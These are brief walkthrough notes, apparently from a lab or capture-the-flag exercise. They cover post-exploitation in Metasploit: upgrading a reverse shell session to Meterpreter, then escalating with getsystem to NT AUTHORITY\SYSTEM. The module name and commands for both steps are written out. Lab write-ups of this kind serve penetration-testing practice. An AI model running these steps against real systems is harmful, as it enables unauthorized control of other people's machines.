
**Upgrading Shell to a Meterpreter**
- Upon researching for POST modules that can upgrade a shell session to a meterpreter I stumbled across: `post/multi/manage/shell_to_meterpreter`
- `use ...` and set the options!
- `set SESSION 1`, we chose 1 because upon running 'sessions' we were able to view that our previously gained default shell is backgrounded as the first and only session.
- `run` -> Shell has been upgraded to a Meterpreter on Session 2
- We now have 2 sessions, both reverse connections (SHELL + METERPRETER)

**Verify Authority**
- `getsystem`
- regular shell -> `shell` or `whoami` -> NT AUTHORITY\SYSTEM

